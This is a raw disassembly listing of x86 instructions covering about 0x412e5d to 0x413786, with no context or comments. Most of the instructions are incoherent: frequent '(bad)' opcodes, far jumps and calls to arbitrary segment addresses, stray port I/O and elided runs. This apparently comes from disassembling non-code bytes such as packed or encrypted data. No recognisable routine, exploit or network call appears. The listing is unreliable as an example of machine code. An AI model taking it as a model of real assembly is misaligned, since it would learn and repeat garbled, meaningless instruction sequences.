  412e5d:	xchg   ecx,eax
  412e5e:	or     ebx,DWORD PTR [ecx]
  412e60:	(bad)  
  412e61:	xchg   esi,eax
  412e62:	leave  
  412e63:	dec    eax
  412e64:	push   cs
  412e65:	pop    esp
  412e66:	adc    eax,0x68e9fe14
  412e6b:	scas   eax,DWORD PTR es:[edi]
  412e6c:	and    edx,ecx
  412e6e:	test   al,0x71
  412e70:	and    ebp,ebp
  412e72:	repz push es
  412e74:	jne    0x412e87
  412e76:	imul   esi,DWORD PTR [edi-0x389702dd],0xb5a4f923
  412e80:	dec    edi
  412e81:	bound  esi,QWORD PTR [esi-0x2a60ed5]
  412e87:	adc    al,0x54
  412e89:	call   0xdf57:0xa5884168
  412e90:	out    0x2f,eax
  412e92:	loope  0x412ea8
  412e94:	(bad)  
  412e95:	bound  esp,QWORD PTR [eax]
  412e97:	out    0x23,eax
  412e99:	jmp    0x7e31:0xb4d280ab
  412ea0:	dec    ebx
  412ea1:	int    0x1b
  412ea3:	mov    ch,0x8a
  412ea5:	pop    ds
	...
  412eb6:	add    BYTE PTR [eax],al
  412eb8:	int3   
  412eb9:	arpl   dx,si
  412ebb:	add    dh,ch
  412ebd:	icebp  
  412ebe:	mov    eax,ebx
  412ec0:	cmp    BYTE PTR [esi],0x22
  412ec3:	cmp    BYTE PTR [esi+0x57],ah
  412ec6:	mov    esi,ecx
  412ec8:	icebp  
  412ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eca:	icebp  
  412ecb:	dec    DWORD PTR [esi]
  412ecd:	jle    0x412f39
  412ecf:	and    al,0xfd
  412ed1:	pop    es
  412ed2:	fmul   DWORD PTR [ebx+0x3b221f15]
  412ed8:	mov    bh,BYTE PTR [edi+0x5a]
  412edb:	and    al,0x11
  412edd:	jno    0x412f26
  412edf:	jmp    0x412eb6
  412ee1:	jg     0x412f3d
  412ee3:	and    al,0xe1
  412ee5:	jg     0x412f29
  412ee7:	and    al,0xc1
  412ee9:	das    
  412eea:	test   BYTE PTR [eax*8-0x5f8afffa],ah
  412ef1:	xchg   DWORD PTR [eax+ebp*1+0x695],edi
  412ef8:	add    eax,0x84003b10
  412efd:	push   es
  412efe:	add    BYTE PTR [esp+edx*4-0x79],bh
  412f02:	std    
  412f03:	add    al,BYTE PTR [ebp-0x4a8380d8]
  412f09:	cs (bad) 
  412f0b:	jl     0x412e96
  412f0d:	push   es
  412f0e:	jl     0x412f15
  412f10:	(bad)  
  412f12:	add    DWORD PTR [edx+ebp*2+0x7f],esi
  412f16:	dec    edx
  412f17:	and    al,0x1
  412f19:	pop    esp
  412f1a:	dec    edi
  412f1b:	mov    eax,DWORD PTR [eax]
	...
  412f2d:	add    BYTE PTR [edi],bl
  412f2f:	fmulp  st(4),st
  412f31:	repz push cs
  412f33:	repz jmp 0x22930169
  412f39:	pop    eax
  412f3a:	ror    BYTE PTR [ecx+0x22],cl
  412f3d:	adc    dl,al
  412f3f:	(bad)  
  412f40:	sub    edi,edx
  412f42:	imul   edx,DWORD PTR [esi-0x77],0xffffffce
  412f46:	lock pop es
  412f48:	outs   dx,BYTE PTR ds:[esi]
  412f49:	out    dx,eax
  412f4a:	pop    ds
  412f4b:	add    DWORD PTR [ebx+eax*2],ebx
  412f4e:	int3   
  412f4f:	das    
  412f50:	jg     0x412f40
  412f52:	icebp  
  412f53:	call   0x23b6:0xa4e2ea24
  412f5a:	loopne 0x412f0e
  412f5c:	(bad)  
  412f5d:	(bad)  
  412f5e:	mov    eax,ds:0xd8cd8ecd
  412f63:	lea    edx,[ebx]
  412f65:	(bad)  
  412f66:	out    0xec,eax
  412f68:	sbb    al,BYTE PTR [edx-0x70f6e323]
  412f6e:	jno    0x412f8f
  412f70:	add    al,BYTE PTR [eax]
  412f72:	jnp    0x412f1d
  412f74:	out    dx,eax
  412f75:	add    esi,eax
  412f77:	pop    ds
  412f78:	scas   eax,DWORD PTR es:[edi]
  412f79:	push   edx
  412f7a:	and    BYTE PTR [ebp+0x6fd6e749],ah
  412f80:	sbb    bh,dh
  412f82:	jnp    0x412f67
  412f84:	fbld   TBYTE PTR [edi]
  412f86:	cmp    eax,0x6bcd8ecf
  412f8b:	push   edi
  412f8c:	sub    ebp,edi
  412f8e:	mov    ds:0x3a1a88,al
	...
  412fa3:	add    BYTE PTR [ebx+0x2c8aea10],dh
  412fa9:	inc    esp
  412faa:	jmp    0x77ff:0xfe4b763a
  412fb1:	xor    cl,BYTE PTR [ebx]
  412fb3:	sub    DWORD PTR [esi-0xf000009],0x1f
  412fba:	mov    es,WORD PTR [ebp+ebx*1+0x20]
  412fbe:	(bad)  
  412fbf:	push   eax
  412fc1:	dec    ebx
  412fc2:	inc    DWORD PTR [edx+0x68e1d4d]
  412fc8:	add    eax,0x3fff9720
  412fcd:	arpl   sp,dx
  412fcf:	mov    dl,BYTE PTR [esi+eax*1-0x5d874433]
  412fd6:	(bad)  
  412fd7:	out    dx,eax
  412fd8:	ins    BYTE PTR es:[edi],dx
  412fd9:	and    ebx,DWORD PTR [ebx+eiz*8-0xb8796]
  412fe0:	pop    ss
  412fe1:	adc    DWORD PTR [ecx+0x10407ab5],ebx
  412fe7:	in     eax,0x17
  412fe9:	adc    ebp,esi
  412feb:	pop    ebx
  412fec:	lock push es
  412fee:	jmp    0xfcca20f6
  412ff3:	(bad)  
  412ff4:	out    dx,eax
  412ff5:	adc    BYTE PTR [edi],cl
  412ff7:	rcl    BYTE PTR [ebx],0xfb
  412ffa:	pop    ebx
  412ffb:	and    al,0x6c
  412ffd:	mov    bl,0xeb
  412fff:	sbb    cl,dl
  413001:	lods   eax,DWORD PTR ds:[esi]
  413002:	jno    0x412fbb
  413004:	adc    ebp,DWORD PTR [edi+0xbf71]
	...
  41301a:	adc    ebx,edi
  41301c:	sbb    esi,DWORD PTR [edx+ebp*2-0x3cf93fbf]
  413023:	adc    BYTE PTR [ebp-0x1b04a1fc],ah
  413029:	add    esi,eax
  41302b:	xor    DWORD PTR [ecx+edi*8],0x8ecb1c9e
  413032:	cmp    ebp,ebx
  413034:	and    BYTE PTR [ecx-0x71296572],al
  41303a:	cmp    ebp,ebx
  41303c:	ror    BYTE PTR [esi+0x3e4fb65],0xf0
  413043:	jge    0x413019
  413045:	fild   QWORD PTR [ebx]
  413047:	jle    0x412ff5
  413049:	fistp  WORD PTR [edi]
  41304b:	jle    0x413009
  41304d:	fucomip st,st(7)
  41304f:	mov    DWORD PTR [ecx-0xf],0x6bc106c
  413056:	mov    bh,0x1b
  413058:	in     eax,dx
  413059:	mov    gs,WORD PTR [ebp-0x5]
  41305c:	(bad)  
  41305d:	in     al,dx
  41305e:	repz push es
  413060:	push   ebx
  413061:	cdq    
  413062:	inc    dx
  413064:	out    0x5f,eax
  413066:	ficom  DWORD PTR [eax]
  413068:	(bad)  
  413069:	push   ds
  41306a:	jno    0x413060
  41306c:	add    ebp,ecx
  41306e:	repz mov esi,edi
  413071:	ficom  WORD PTR [edi-0xc1700e4]
  413077:	retf   
  413078:	jnp    0x41303f
  41307a:	pop    ds
  41307b:	add    DWORD PTR [ebp+0x8],eax
	...
  41308d:	add    BYTE PTR [eax],al
  41308f:	add    bl,dh
  413091:	push   es
  413092:	add    BYTE PTR [edx+0x47],ah
  413095:	in     al,0x53
  413097:	jb     0x4130d2
  413099:	(bad)  
  41309b:	ins    BYTE PTR es:[edi],dx
  41309c:	lock cld 
  41309e:	cmp    ch,BYTE PTR [esi-0x5974fa7e]
  4130a4:	pushf  
  4130a5:	jl     0x4130ea
  4130a7:	or     eax,0x12ea7cc0
  4130ac:	sbb    DWORD PTR [ebx-0x1c579bb1],edi
  4130b2:	cmp    ebx,DWORD PTR [eax]
  4130b4:	gs inc ecx
  4130b6:	mov    BYTE PTR ds:0x17e7e390,dl
  4130bc:	not    DWORD PTR [eax]
  4130be:	(bad)  
  4130bf:	rol    BYTE PTR [edi-0x3fe4cc1d],1
  4130c5:	jl     0x41311a
  4130c7:	int    0xa3
  4130c9:	mov    eax,0x283a7251
  4130ce:	out    0x78,al
  4130d0:	fst    DWORD PTR [eax]
  4130d2:	mov    al,BYTE PTR [ecx+0x2123c365]
  4130d8:	mov    eax,ds:0x142f8abf
  4130dd:	cmp    al,dh
  4130df:	push   esi
  4130e0:	stc    
  4130e1:	int3   
  4130e2:	les    esp,FWORD PTR [edx-0x78]
  4130e5:	jecxz  0x4130fa
  4130e7:	add    BYTE PTR [edi],dh
  4130e9:	adc    ecx,DWORD PTR [ecx-0x76c512b4]
  4130ef:	push   esp
  4130f0:	in     eax,dx
  4130f1:	xchg   DWORD PTR ss:[eax+eax*1+0x0],ecx
	...
  413106:	in     eax,dx
  413107:	xor    al,BYTE PTR [edi-0x76c8c2ac]
  41310d:	inc    esp
  41310e:	sub    eax,0x59555513
  413113:	or     ah,0xe8
  413116:	fcomp  st(4)
  413118:	std    
  413119:	inc    DWORD PTR [edx+0x5e38223e]
  41311f:	push   esp
  413120:	mov    esi,ecx
  413122:	xchg   edx,eax
  413123:	loop   0x41310b
  413125:	mov    ds:0x3bfdedf8,eax
  41312a:	pushf  
  41312b:	jne    0x413165
  41312d:	mov    ecx,DWORD PTR ds:0x4f3b3627
  413133:	add    al,BYTE PTR cs:[eax]
  413136:	leave  
  413137:	jge    0x413140
  413139:	xor    DWORD PTR [edi+0x22],0x2
  41313d:	add    cl,bl
  41313f:	or     dh,BYTE PTR [eax+ebx*1-0x3c]
  413143:	or     al,BYTE PTR ds:0x376c900
  413149:	adc    DWORD PTR [esi+0x4],0x74
  41314d:	sbb    esp,eax
  41314f:	or     bh,BYTE PTR [ebp+0x0]
  413152:	mov    DWORD PTR [esi+0x3],esi
  413155:	and    DWORD PTR [esi+0x3],0x74
  413159:	or     eax,0xce8952ee
  41315e:	popa   
  41315f:	fucomi st,st(7)
  413161:	inc    DWORD PTR [esi]
  413163:	xor    edi,ebp
  413165:	jmp    0x413110
  413167:	jnp    0x4131d3
  413169:	and    al,0x0
	...
  41317b:	add    BYTE PTR [ecx+0xd],ch
  41317e:	(bad)  
  41317f:	call   FWORD PTR [ecx+0xa]
  413182:	mov    edx,ebx
  413184:	lock or BYTE PTR [ecx],dh
  413187:	push   ecx
  413188:	mov    ebp,0x37e748a8
  41318d:	mov    dh,0x17
  41318f:	(bad)  
  413190:	lods   eax,DWORD PTR ds:[esi]
  413191:	mov    al,ds:0xc2c50027
  413196:	mov    DWORD PTR [ebx+0xc],ebp
  413199:	xor    BYTE PTR [ebx-0x3cb42bbd],cl
  41319f:	inc    edi
  4131a0:	jns    0x4131ee
  4131a2:	ficom  WORD PTR [edi-0x25]
  4131a5:	xlat   BYTE PTR ds:[ebx]
  4131a6:	pop    es
  4131a7:	sbb    BYTE PTR [edi-0x8],0x17
  4131ab:	(bad)  
  4131ac:	jne    0x4131b3
  4131ae:	or     BYTE PTR [esp+eiz*2+0x73000220],al
  4131b5:	adc    eax,0xa16e0f00
  4131ba:	add    al,BYTE PTR [eax]
  4131bc:	lock cwde 
  4131be:	(bad)  
  4131bf:	and    eax,DWORD PTR [eax]
  4131c1:	aad    0x8a
  4131c3:	ret    0x5d0b
  4131c6:	mov    bl,0x50
  4131c8:	imul   ebp,DWORD PTR [ebp+0x2b],0x2e
  4131cc:	fiadd  WORD PTR [esi+edx*1-0x76]
  4131d0:	sbb    al,0x4
  4131d2:	fcom   QWORD PTR [esi+0x22]
  4131d5:	test   eax,0x47c88a45
  4131da:	add    al,0xf1
  4131dc:	scas   eax,DWORD PTR es:[edi]
  4131dd:	fs fcmovb st,st(4)
	...
  4131f0:	add    BYTE PTR [eax],al
  4131f2:	daa    
  4131f3:	jecxz  0x41317f
  4131f5:	inc    ebx
  4131f6:	aam    0x37
  4131f8:	fld    DWORD PTR [ebp+0x223cc]
  4131fe:	add    eax,0xd8bd8117
  413203:	and    eax,DWORD PTR [edx]
  413205:	add    al,dh
  413207:	or     edi,edx
  413209:	cmp    al,0xf0
  41320b:	and    al,BYTE PTR [edx]
  41320d:	add    ah,ch
  41320f:	push   es
  413210:	in     al,dx
  413211:	and    BYTE PTR [esi+0x8],0xd5
  413215:	fistp  WORD PTR [edi+eax*1]
  413218:	aam    0x3
  41321a:	lock mov ah,bl
  41321d:	or     BYTE PTR [esi+0x9],0xbd
  413221:	sti    
  413222:	sahf   
  413223:	mov    dh,0x71
  413225:	inc    esi
  413226:	push   edi
  413227:	mov    edi,0x21361737
  41322c:	idiv   BYTE PTR [eax+0x4c69adca]
  413232:	lods   al,BYTE PTR es:[esi]
  413234:	imul   eax,DWORD PTR [eax-0x19],0x6b03f048
  41323b:	call   0x3ed1:0x497af3c4
  413242:	mov    bh,0xb3
  413244:	jno    0x41328c
  413246:	pop    ss
  413247:	in     eax,dx
  413248:	push   es
  413249:	pop    ss
  41324a:	test   dl,0x69
  41324d:	daa    
  41324e:	lock xchg ecx,eax
  413250:	shr    DWORD PTR [edx],cl
  413252:	idiv   DWORD PTR [edi+0x34]
  413255:	loopne 0x413257
	...
  413267:	add    bh,ch
  413269:	jns    0x41328c
  41326b:	pop    ss
  41326c:	inc    eax
  41326d:	mov    ecx,0x4d74561
  413272:	xlat   BYTE PTR ds:[ebx]
  413273:	push   ss
  413274:	mov    BYTE PTR [eax+0x4a23e03c],0xe7
  41327b:	add    esi,eax
  41327d:	push   es
  41327e:	repnz ss and ah,dh
  413282:	jae    0x4132fe
  413284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413285:	or     al,0xe8
  413287:	add    ebp,DWORD PTR [ebx-0x7b]
  41328a:	cld    
  41328b:	call   DWORD PTR [edi+0x7ab4390c]
  413291:	cmp    eax,0xc942090
  413296:	jge    0x41329c
  413298:	dec    esi
  413299:	repz (bad) 
  41329b:	in     al,dx
  41329c:	repz push es
  41329e:	add    ecx,DWORD PTR [edx+ecx*2+0x724c712d]
  4132a5:	inc    ecx
  4132a6:	(bad)  
  4132a7:	call   0xe9452291
  4132ac:	repz jns 0x4132f9
  4132af:	loopne 0x413311
  4132b1:	out    dx,eax
  4132b2:	mov    ch,BYTE PTR [edi+0x43]
  4132b5:	or     BYTE PTR [eax],al
  4132b7:	jmp    0xed58b528
  4132bc:	repz push es
  4132be:	inc    eax
  4132bf:	pusha  
  4132c0:	jne    0x4132b2
  4132c2:	add    ebp,ecx
  4132c4:	repz jge 0x41324c
  4132c7:	stc    
  4132c8:	pop    ds
  4132c9:	or     al,0xfe
  4132cb:	bound  eax,QWORD PTR [eax]
	...
  4132dd:	add    BYTE PTR [ebp-0xc16fc0d],dl
  4132e3:	or     BYTE PTR [edi],0xeb
  4132e6:	ror    DWORD PTR [ecx],0xc1
  4132e9:	jno    0x4132ee
  4132eb:	pop    es
  4132ec:	sahf   
  4132ed:	aad    0xf7
  4132ef:	or     edi,esi
  4132f1:	je     0x4132df
  4132f3:	add    BYTE PTR [ebp-0x1f41807],0x70
  4132fa:	pop    esi
  4132fb:	hlt    
  4132fc:	add    ebp,ecx
  4132fe:	repz (bad) 
  413300:	mov    BYTE PTR [edi-0x38],bl
  413303:	pop    es
  413304:	add    cl,ch
  413306:	jp     0x413289
  413308:	pmulhw mm6,mm3
  41330b:	push   es
  41330c:	mov    ebp,DWORD PTR [edi-0x4c]
  41330f:	pop    es
  413310:	add    cl,ch
  413312:	jns    0x41330f
  413314:	add    DWORD PTR [ebx-0x678ba02],edi
  41331a:	repnz ins BYTE PTR es:[edi],dx
  41331c:	sbb    ebp,ebp
  41331e:	repz push es
  413320:	jne    0x413312
  413322:	js     0x4132a5
  413324:	lldt   WORD PTR [ebp+0x17890007]
  41332b:	or     eax,DWORD PTR [edx]
  41332d:	add    BYTE PTR [ecx+0x3d8e8747],cl
  413333:	or     edi,esi
  413335:	jmp    eax
  413337:	mov    WORD PTR [esi],cs
  413339:	add    al,0x49
  41333b:	pop    es
  41333c:	mov    eax,DWORD PTR [esi-0x1f49f]
	...
  413352:	add    BYTE PTR [eax],al
  413354:	or     DWORD PTR [ebx],esp
  413356:	mov    DWORD PTR [esi-0x1f4d7],eax
  41335c:	pop    ss
  41335d:	add    eax,DWORD PTR [eax]
  41335f:	mov    ecx,edi
  413361:	push   cs
  413362:	add    al,BYTE PTR [eax]
  413364:	sbb    DWORD PTR [esi-0x7c],edi
  413367:	sbb    BYTE PTR ds:0xaf010007,dl
  41336d:	adc    al,BYTE PTR [edx]
  41336f:	add    BYTE PTR [ecx],cl
  413371:	push   ds
  413372:	retf   
  413373:	sar    BYTE PTR [ecx],cl
  413375:	jle    0x4133b9
  413377:	and    al,0x4d
  413379:	mov    WORD PTR [esi+0x4a7e3874],?
  41337f:	and    al,0x69
  413381:	jle    0x413317
  413383:	adc    ch,dl
  413385:	push   es
  413386:	add    BYTE PTR [ebx],ch
  413388:	and    eax,0x62514e27
  41338d:	test   BYTE PTR [edx],dl
  41338f:	add    al,0xc9
  413391:	push   es
  413392:	sub    ecx,DWORD PTR [ebp+esi*8+0x52]
  413396:	push   eax
  413397:	push   ecx
  413398:	out    0xf3,al
  41339a:	into   
  41339b:	adc    DWORD PTR [ebp-0xb3f7cea],0xfffffffe
  4133a2:	pop    esp
  4133a3:	mov    ebx,DWORD PTR [edx+0x4f]
  4133a6:	pop    ebp
  4133a7:	pop    esi
  4133a8:	sbb    cl,dl
  4133aa:	ss ret 0x2f1
  4133ae:	mov    eax,DWORD PTR [esi-0x1f010]
  4133b4:	pop    DWORD PTR [ebp-0x42]
  4133b7:	and    eax,DWORD PTR [eax]
	...
  4133c9:	add    BYTE PTR [eax],ah
  4133cb:	jecxz  0x413385
  4133cd:	pop    esi
  4133ce:	push   ds
  4133cf:	popf   
  4133d0:	ds aaa 
  4133d2:	mov    dl,0x38
  4133d4:	add    bh,BYTE PTR [eax+0x81ff0]
  4133da:	xor    edx,DWORD PTR [ebp-0x6b0bdc42]
  4133e0:	dec    edx
  4133e1:	ror    BYTE PTR [ecx+0x1d],0x85
  4133e5:	inc    ebx
  4133e6:	clc    
  4133e7:	pop    edi
  4133e8:	aas    
  4133e9:	mov    ch,BYTE PTR [ebx+edi*8-0x3b37ef9]
  4133f0:	(bad)  
  4133f1:	push   eax
  4133f3:	call   0x2b3e:0x9ef77442
  4133fa:	in     al,dx
  4133fb:	pop    ds
  4133fc:	add    al,bl
  4133fe:	imul   ebx,DWORD PTR [esi+ebx*8+0x21fec43],0xffffff8b
  413406:	fs inc esp
  413408:	ret    0xf003
  41340b:	pop    ds
  41340c:	mov    cl,0x8a
  41340e:	ins    BYTE PTR es:[edi],dx
  41340f:	inc    esp
  413410:	ret    0xf003
  413413:	pop    ds
  413414:	mov    al,0x8a
  413416:	test   BYTE PTR [ebx-0x2a],al
  413419:	add    esi,eax
  41341b:	pop    ds
  41341c:	mov    bl,0x4f
  41341e:	imul   esp,DWORD PTR [ebx+0x1fec3fe7],0x2
  413425:	push   edx
  413426:	and    BYTE PTR [ebx+0x37e823bf],ch
  41342c:	mov    bl,0xf4
	...
  41343e:	add    BYTE PTR [eax],al
  413440:	mov    edi,0x4c38448
  413445:	sbb    al,0x2
  413447:	add    BYTE PTR [ebx-0x4b34c095],dh
  41344d:	push   es
  41344e:	mov    ch,0x40
  413450:	stos   DWORD PTR es:[edi],eax
  413451:	cmp    ch,BYTE PTR [eax+eax*2+0x7d3b3aab]
  413458:	xchg   esp,eax
  413459:	xchg   DWORD PTR [esp+edx*1-0x79],edi
  41345d:	or     eax,ebp
  41345f:	mov    dh,0x25
  413461:	mov    dl,0x71
  413463:	mov    ecx,0x391d7ef
  413468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413469:	push   ebp
  41346a:	test   al,0xc2
  41346c:	mov    al,0x6
  41346e:	jo     0x413484
  413470:	xor    BYTE PTR [esi],cl
  413472:	jmp    0xf943d279
  413477:	jl     0x4134b9
  413479:	test   DWORD PTR [edi+0xb],eax
  41347c:	not    DWORD PTR [ecx+0x74]
  41347f:	std    
  413480:	scas   eax,DWORD PTR es:[edi]
  413481:	mov    eax,0x3e6d03a7
  413486:	in     eax,0x78
  413488:	inc    eax
  413489:	stc    
  41348a:	jbe    0x4134d1
  41348c:	outs   dx,DWORD PTR ds:[esi]
  41348d:	ret    0x3c03
  413490:	mov    dl,0x85
  413492:	and    esp,ecx
  413494:	fwait
  413495:	aaa    
  413496:	xlat   BYTE PTR ds:[ebx]
  413497:	xor    eax,0xff8b8595
  41349c:	lock xchg ebx,eax
  41349e:	bnd jl 0x4134d0
  4134a1:	adc    DWORD PTR [eax],esp
  4134a3:	add    DWORD PTR [eax],0x0
	...
  4134b5:	add    BYTE PTR [ebx-0xde128fa],ch
  4134bb:	jns    0x413499
  4134bd:	cmc    
  4134be:	je     0x41344e
  4134c0:	out    0x86,eax
  4134c2:	xchg   ebx,eax
  4134c3:	dec    edx
  4134c4:	clc    
  4134c5:	adc    dl,dh
  4134c7:	or     al,ch
  4134c9:	xchg   BYTE PTR [ebx-0x39ed0786],dl
  4134cf:	or     al,ch
  4134d1:	aam    0x9a
  4134d3:	clc    
  4134d4:	jbe    0x41345b
  4134d6:	mov    edi,0xf427ffb9
  4134db:	jns    0x413510
  4134dd:	shr    DWORD PTR [esi+0xa],1
  4134e0:	sbb    esp,DWORD PTR [esi+ebx*4]
  4134e3:	jle    0x413528
  4134e5:	aam    0xdb
  4134e7:	jg     0x41352c
  4134e9:	hlt    
  4134ea:	add    ebx,DWORD PTR ds:0xd3af6307
  4134f0:	stos   DWORD PTR es:[edi],eax
  4134f1:	jno    0x4134aa
  4134f3:	jmp    0x413484
  4134f5:	sub    ch,BYTE PTR [edi+0xd]
  4134f8:	sbb    esi,ebp
  4134fa:	sbb    al,0x4d
  4134fc:	sbb    ebp,ecx
  4134fe:	repz push es
  413500:	setg   BYTE PTR [ebp+0x10]
  413504:	dec    ebp
  413505:	test   al,0xf3
  413507:	jns    0x41353c
  413509:	icebp  
  41350a:	jbe    0x413516
  41350c:	aaa    
  41350d:	int3   
  41350e:	inc    ebp
  41350f:	jle    0x413554
  413511:	cld    
  413512:	sti    
  413513:	jg     0x413558
  413515:	fadd   st(3),st
  413517:	sbb    al,0x7
  413519:	arpl   WORD PTR [eax],ax
	...
  41352b:	add    BYTE PTR [edi],dh
  41352d:	shr    DWORD PTR [ebx-0x7014d09f],cl
  413533:	stos   BYTE PTR es:[edi],al
  413534:	jbe    0x413543
  413536:	aaa    
  413537:	popf   
  413538:	(bad)  
  413539:	(bad)  
  41353a:	(bad)  
  41353c:	test   eax,0x2c9e0784
  413541:	or     BYTE PTR [esi-0x7b],bh
  413544:	call   0xf1b634bf
  413549:	jnp    0x41354e
  41354b:	push   esp
  41354c:	xchg   ebx,eax
  41354d:	mov    ecx,0x83e4e940
  413552:	mov    ecx,?
  413554:	add    BYTE PTR [ecx],cl
  413556:	(bad)  
  413557:	out    dx,al
  413558:	cmp    DWORD PTR [ebp+0x7b3261f],eax
  41355e:	jle    0x4135ad
  413560:	out    dx,eax
  413561:	jbe    0x413562
  413563:	(bad)  
  413564:	std    
  413565:	add    al,0x8b
  413567:	add    al,0x14
  413569:	arpl   WORD PTR [ecx+eax*2-0x67],cx
  41356d:	or     al,0x82
  41356f:	mov    ebp,0xfffdf6c9
  413574:	retf   0xf981
  413577:	sbb    ch,dh
  413579:	rol    BYTE PTR [eax-0x7d],0x63
  41357d:	adc    cl,BYTE PTR ds:0xfdf6a38c
  413583:	inc    DWORD PTR [eax+eax*4]
  413586:	push   cs
  413587:	push   esi
  413589:	cmc    
  41358a:	dec    esi
  41358b:	call   0x4138e0
	...
  4135a0:	add    BYTE PTR [eax],al
  4135a2:	not    BYTE PTR [ecx+ebx*2-0x77]
  4135a6:	lds    edx,FWORD PTR [edi-0x40]
  4135a9:	or     BYTE PTR [ecx+0x50],cl
  4135ac:	xchg   ebp,esp
  4135ae:	fsub   st,st(6)
  4135b0:	jle    0x4135b2
  4135b2:	pop    ecx
  4135b3:	add    edx,DWORD PTR [ebx+0x56]
  4135b6:	pop    esi
  4135b7:	mov    al,BYTE PTR [ebx+0x8]
  4135ba:	les    ecx,FWORD PTR [edi+0x7e]
  4135bd:	mov    ecx,0x349
  4135c2:	nop
  4135c3:	rol    DWORD PTR [ecx+0x318a0dc0],0x81
  4135ca:	out    dx,eax
  4135cb:	add    al,BYTE PTR [eax]
  4135cd:	cld    
  4135ce:	sbb    esp,eax
  4135d0:	in     al,0x6
  4135d2:	xchg   edx,eax
  4135d3:	cmp    DWORD PTR [edi-0x19],edi
  4135d6:	leave  
  4135d7:	add    eax,0xddc80000
  4135dc:	or     BYTE PTR [ecx],cl
  4135de:	out    0x83,eax
  4135e0:	xor    eax,0xaee81
  4135e5:	cld    
  4135e6:	leave  
  4135e7:	dec    ecx
  4135e8:	out    dx,al
  4135e9:	or     ah,al
  4135eb:	sbb    BYTE PTR [eax+0x3766f032],cl
  4135f1:	xor    BYTE PTR [edx+0x71377cec],0xd5
  4135f8:	inc    ecx
  4135f9:	push   cs
  4135fa:	lock out dx,eax
  4135fc:	inc    edx
  4135fd:	out    dx,al
  4135fe:	imul   al
  413600:	iret   
  413601:	mov    dh,ah
  413603:	push   0x80d4
	...
  413618:	xchg   esi,eax
  413619:	lock adc DWORD PTR [edx],eax
  41361c:	lock scas al,BYTE PTR es:[edi]
  41361e:	daa    
  41361f:	or     edi,DWORD PTR [ebx-0x7]
  413622:	test   dl,ah
  413624:	(bad)  
  413625:	scas   al,BYTE PTR es:[edi]
  413626:	and    al,0xf
  413628:	jmp    0x7158b2da
  41362d:	xchg   ecx,eax
  41362e:	add    eax,esi
  413630:	repz out dx,eax
  413632:	inc    edx
  413633:	jmp    0x7722:0x882fe6ec
  41363a:	xor    al,0x82
  41363c:	xor    ch,ah
  41363e:	jl     0x41366f
  413640:	jae    0x413698
  413642:	ror    BYTE PTR [edx],1
  413644:	add    esp,DWORD PTR [edi-0x2c]
  413647:	dec    eax
  413648:	jae    0x41367a
  41364a:	add    eax,0x87bb2985
  41364f:	mov    WORD PTR [ebp-0x30184e91],?
  413655:	out    dx,eax
  413656:	add    DWORD PTR [eax],eax
  413658:	mov    edi,0x488accd
  41365d:	ret    
  41365e:	inc    ebx
  41365f:	add    esi,eax
  413661:	push   0x59ec23c5
  413666:	dec    ecx
  413667:	dec    ebx
  413668:	mov    cl,0xef
  41366a:	jl     0x413675
  41366c:	imul   edi,eax,0x70f4c184
  413672:	inc    ecx
  413673:	add    esi,DWORD PTR [ecx-0x7]
  413676:	retf   0x314c
  413679:	pop    es
  41367a:	out    0x91,eax
	...
  41368c:	add    BYTE PTR [eax],al
  41368e:	(bad)
  413691:	add    edi,DWORD PTR [ebx+0x4a]
  413694:	or     ecx,DWORD PTR [eax]
  413696:	mov    bh,BYTE PTR [esi-0x6f403ae5]
  41369c:	out    dx,eax
  41369d:	jl     0x413688
  41369f:	mov    DWORD PTR [edi-0x14378cf8],esp
  4136a5:	test   BYTE PTR [ecx-0x603ae3c2],ch
  4136ab:	ja     0x413642
  4136ad:	inc    edx
  4136ae:	repz push es
  4136b0:	xor    al,0x7d
  4136b2:	xchg   esp,eax
  4136b3:	push   esi
  4136b4:	aaa    
  4136b5:	mov    bl,0x7a
  4136b7:	dec    ebx
  4136b8:	fistp  QWORD PTR [edx+0x1c]
  4136bb:	adc    esi,DWORD PTR [ecx+edi*4+0x7f]
  4136bf:	pop    eax
  4136c0:	pop    ss
  4136c1:	sbb    al,0xe
  4136c3:	pop    es
  4136c4:	out    0x3,eax
  4136c6:	fdivr  DWORD PTR [esi-0x6da03ae5]
  4136cc:	lods   al,BYTE PTR ds:[esi]
  4136cd:	or     esp,DWORD PTR [edi-0xffbcf12]
  4136d3:	push   es
  4136d4:	mov    edx,0xb7feac80
  4136d9:	sbb    ecx,edi
  4136db:	push   es
  4136dc:	out    0x3,eax
  4136de:	fwait
  4136df:	(bad)  
  4136e0:	dec    ebx
  4136e1:	mov    cl,0x31
  4136e3:	push   cs
  4136e4:	out    0xb2,eax
  4136e6:	jp     0x413732
  4136e8:	add    edi,esp
  4136ea:	push   0x5a
  4136ec:	retf   
  4136ed:	jmp    FWORD PTR [eax-0x39]
  4136f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4136f1:	inc    BYTE PTR [eax]
	...
  413703:	add    BYTE PTR [ebp+0xf],al
  413706:	sub    BYTE PTR ds:0x7ce18fdf,ah
  41370c:	xor    BYTE PTR [esi-0xa],al
  41370f:	push   ebp
  413710:	call   0xfb353fdc
  413715:	adc    BYTE PTR [eax],al
  413717:	pusha  
  413718:	jmp    0x7ba:0xdea9bf8f
  41371f:	test   al,0xc
  413721:	or     al,0x9
  413723:	repz dec esp
  413725:	push   cs
  413726:	xchg   DWORD PTR [eax+0x6004c672],edi
  41372c:	xor    al,BYTE PTR [ebp+ecx*1+0x7f]
  413730:	retf   0x170f
  413733:	jo     0x413769
  413735:	inc    esp
  413736:	or     eax,0xdfc7a47f
  41373b:	rcr    DWORD PTR [esi+ecx*1],1
  41373e:	xchg   DWORD PTR [eax-0xf49ea4d],ebp
  413744:	xor    al,0xe7
  413746:	adc    dl,ah
  413748:	mov    DWORD PTR [edi+0x4434600a],ecx
  41374e:	or     eax,0xdfc7743f
  413753:	icebp  
  413754:	push   0xe
  413756:	or     eax,0xbf0df33f
  41375b:	pusha  
  41375c:	pop    ecx
  41375d:	popa   
  41375e:	ret    0xf3f1
  413761:	push   edi
  413762:	mov    DWORD PTR [ebp-0x5a76f3a9],esi
	...
  413778:	add    BYTE PTR [eax],al
  41377a:	dec    edi
  41377b:	adc    BYTE PTR [ecx+0x18ebb4eb],cl
  413781:	jno    0x41376f
  413783:	inc    ebp
  413784:	mov    ebx,ebp
  413786:	mov    ah,0xeb
